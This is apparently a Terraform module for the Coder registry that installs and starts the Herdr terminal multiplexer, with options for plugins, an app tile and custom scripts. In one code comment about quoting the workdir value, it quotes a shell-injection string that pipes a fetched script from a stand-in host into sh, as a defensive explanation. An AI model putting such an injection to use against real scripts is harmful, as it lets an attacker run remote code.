terraform {
  required_version = ">= 1.9"

  required_providers {
    coder = {
      source  = "coder/coder"
      version = ">= 2.13"
    }
  }
}

variable "agent_id" {
  description = "The ID of a Coder agent."
  type        = string
}

variable "icon" {
  description = "The icon to use for the install/start scripts and (when app_port is set) the app tile."
  type        = string
  # Not "/icon/herdr.svg": that path is served from Coder's own built-in icon
  # bundle (independent of this repo's .icons/ directory, which is only used
  # to render the registry website), and herdr isn't in it -- pointing there
  # renders a broken image. Pinned to this fork branch for now so it resolves
  # immediately; switch to
  # "https://raw.githubusercontent.com/coder/registry/main/.icons/herdr.svg"
  # once this module is merged upstream.
  default = "https://raw.githubusercontent.com/gojnimer6553/registry/add-herdr-module/.icons/herdr.svg"
}

variable "display_name" {
  description = "The display name prefix for this module's install/start scripts."
  type        = string
  default     = "Herdr"
}

variable "workdir" {
  description = "The directory Herdr's session starts in. Defaults to $HOME. The directory is created if it doesn't exist."
  type        = string
  default     = null
}

variable "session_name" {
  description = <<-EOT
    Name of a Herdr named session (sets HERDR_SESSION) for this module to
    start and manage. Leave unset (default) to use Herdr's default,
    unnamed session -- the same one a user gets by simply typing `herdr` in
    any workspace terminal, so plugins installed by this module and panes
    opened by hand end up in the same place. Only set this if you
    specifically need an isolated session.
  EOT
  type        = string
  default     = null
}

variable "tmux_session" {
  description = <<-EOT
    Name of the tmux session used to give the Herdr server a real
    pseudo-terminal in the background (Herdr, like most terminal
    multiplexers, expects a real tty and has no documented headless/daemon
    startup mode). Change this only if it collides with another session name
    in the workspace.
  EOT
  type        = string
  default     = "herdr"
}

variable "install" {
  description = "Whether to install Herdr. Set to false to run a pre-installed copy instead."
  type        = bool
  default     = true
}

variable "use_cached" {
  description = "Skip installing when `herdr` is already on PATH, instead of always reinstalling on start."
  type        = bool
  default     = false
}

variable "plugins" {
  description = <<-EOT
    Opt-in list of Herdr plugins to install non-interactively on every start,
    each as an "owner/repo" or "owner/repo/subdir" spec passed to
    `herdr plugin install <spec> --yes` (see https://herdr.dev/docs/marketplace/).
    Defaults to none -- Herdr runs with zero plugins unless you list some
    here. For example, ["0cv/herdr-mobile-relay"] registers the mobile-relay
    plugin (remote phone control), matching how you'd normally run
    `herdr plugin install 0cv/herdr-mobile-relay` by hand.

    Installing a plugin here only registers it with Herdr -- it does not run
    that plugin's own setup wizard. Most plugins (including
    0cv/herdr-mobile-relay) still need a one-time interactive setup step from
    a workspace terminal afterwards; see this module's README for details.
    Plugins are third-party, unreviewed content fetched from arbitrary GitHub
    repositories -- only list sources you trust.
  EOT
  type        = list(string)
  default     = []
}

variable "app_port" {
  description = <<-EOT
    If set, exposes this local port as a coder_app tile -- useful when one of
    your `plugins` serves its own local web UI, such as
    0cv/herdr-mobile-relay's relay (default port 8375) once its setup wizard
    has been completed from a workspace terminal. Left unset by default:
    Herdr itself has no web UI, only some plugins do.
  EOT
  type        = number
  default     = null
}

variable "app_slug" {
  description = "The slug of the coder_app resource. Only used when app_port is set."
  type        = string
  default     = "herdr"
}

variable "app_display_name" {
  description = "The display name for the app tile. Only used when app_port is set."
  type        = string
  default     = "Herdr"
}

variable "app_healthcheck_path" {
  description = "Path appended to http://localhost:<app_port> for the app tile's healthcheck. Only used when app_port is set."
  type        = string
  default     = "/healthz"
}

variable "share" {
  description = "Determines visibility of the app tile. Must be one of 'owner', 'authenticated', or 'public'. Only used when app_port is set."
  type        = string
  default     = "owner"

  validation {
    condition     = contains(["owner", "authenticated", "public"], var.share)
    error_message = "Incorrect value. Please set either 'owner', 'authenticated', or 'public'."
  }
}

variable "subdomain" {
  description = <<-EOT
    Determines whether the app tile will be accessed via its own subdomain or
    whether it will be accessed via a path on Coder.
    If wildcards have not been setup by the administrator then apps with "subdomain" set to true will not be accessible.
    Only used when app_port is set.
  EOT
  type        = bool
  default     = true
}

variable "open_in" {
  description = <<-EOT
    Determines where the app tile will be opened. Valid values are `"tab"` and `"slim-window"` (default).
    `"tab"` opens in a new tab in the same browser window.
    `"slim-window"` opens a new browser window without navigation controls.
    Only used when app_port is set.
  EOT
  type        = string
  default     = "slim-window"

  validation {
    condition     = contains(["tab", "slim-window"], var.open_in)
    error_message = "The 'open_in' variable must be one of: 'tab', 'slim-window'."
  }
}

variable "order" {
  description = "The order determines the position of app in the UI presentation. The lowest order is shown first and apps with equal order are sorted by name (ascending order). Only used when app_port is set."
  type        = number
  default     = null
}

variable "group" {
  description = "The name of a group that this app belongs to. Only used when app_port is set."
  type        = string
  default     = null
}

variable "pre_install_script" {
  description = "Custom script to run before installing Herdr. Can be used for dependency ordering between modules."
  type        = string
  default     = null
}

variable "post_install_script" {
  description = "Custom script to run after installing Herdr, before it starts."
  type        = string
  default     = null
}

variable "post_start_script" {
  description = <<-EOT
    Custom script to run every start, after Herdr is up and every entry in
    `plugins` has had an install attempted. Runs with the same PATH this
    script uses (including "$HOME/.local/bin", where Herdr and its plugin
    binaries install to) and the same working directory as the rest of the
    start script.

    Use this for follow-up steps that need Herdr and its plugins already
    running -- for example, a plugin whose own setup wizard assumes
    infrastructure this workspace doesn't have (like a Cloudflare account)
    can often be started directly instead by invoking its installed binary
    yourself here. A non-zero exit from this script fails the start script.
  EOT
  type        = string
  default     = null
}

locals {
  module_dir_name  = ".coder-modules/gojnimer6553/herdr"
  module_directory = "$HOME/${local.module_dir_name}"

  # Kept as an *override only* (empty string means "no override"), rather
  # than pre-resolving the "$HOME"-based default here as a Terraform string --
  # this needs the literal "$HOME" in ARG_WORKDIR_OVERRIDE to expand at shell
  # runtime, but workdir is also a caller-supplied string, and a
  # double-quoted assignment would let a value like
  # `foo"; curl evil.sh | sh #` break out and execute.
  workdir_override = var.workdir != null ? var.workdir : ""

  session_env = var.session_name != null ? var.session_name : ""

  install_script = templatefile("${path.module}/scripts/install.sh.tftpl", {
    ARG_INSTALL    = tostring(var.install)
    ARG_USE_CACHED = tostring(var.use_cached)
  })

  start_script = templatefile("${path.module}/scripts/start.sh.tftpl", {
    ARG_MODULE_DIRECTORY = local.module_directory
    ARG_WORKDIR_OVERRIDE = local.workdir_override
    ARG_SESSION_NAME     = local.session_env
    ARG_TMUX_SESSION     = var.tmux_session
    # Newline-delimited rather than JSON: the start script parses this with
    # a plain `while read` loop so it doesn't need a jq dependency the
    # workspace image may not have.
    ARG_PLUGINS           = join("\n", var.plugins)
    ARG_POST_START_SCRIPT = var.post_start_script != null ? var.post_start_script : ""
  })
}

module "coder_utils" {
  source  = "registry.coder.com/coder/coder-utils/coder"
  version = "0.0.1"

  agent_id            = var.agent_id
  module_directory    = local.module_directory
  display_name_prefix = var.display_name
  icon                = var.icon
  pre_install_script  = var.pre_install_script
  post_install_script = var.post_install_script
  install_script      = local.install_script
  start_script        = local.start_script
}

resource "coder_app" "herdr" {
  count        = var.app_port != null ? 1 : 0
  agent_id     = var.agent_id
  slug         = var.app_slug
  display_name = var.app_display_name
  url          = "http://localhost:${var.app_port}"
  icon         = var.icon
  subdomain    = var.subdomain
  share        = var.share
  order        = var.order
  group        = var.group
  open_in      = var.open_in

  healthcheck {
    url       = "http://localhost:${var.app_port}${var.app_healthcheck_path}"
    interval  = 5
    threshold = 6
  }
}

# Pass-through of coder-utils script outputs so upstream modules can serialize
# their own coder_script resources behind this module's install pipeline
# using `coder exp sync want <self> <each name>`.
output "scripts" {
  description = "Ordered list of coder exp sync names for the coder_script resources this module actually creates, in run order (pre_install, install, post_install, start). Scripts that were not configured are absent from the list."
  value       = module.coder_utils.scripts
}
